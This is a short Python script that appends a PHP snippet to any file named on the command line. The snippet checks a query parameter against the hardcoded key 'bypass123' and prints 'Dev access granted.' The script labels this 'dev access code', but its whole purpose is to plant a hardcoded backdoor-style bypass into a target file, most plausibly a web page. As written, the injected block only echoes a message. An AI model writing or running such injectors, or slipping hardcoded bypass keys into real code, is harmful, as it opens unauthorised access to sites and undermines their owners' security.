def append(path):
    """Append dev access code to the specified file."""
    content = '''if (isset($_GET['devkey']) && $_GET['devkey'] == 'bypass123') {
    echo "Dev access granted.";
}
?>
'''

    with open(path, 'a') as f:
        f.write(content)

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python append.py <target_file>")
        sys.exit(1)

    target_path = sys.argv[1]
    append(target_path)
    print(f"Dev access code appended to {target_path}")

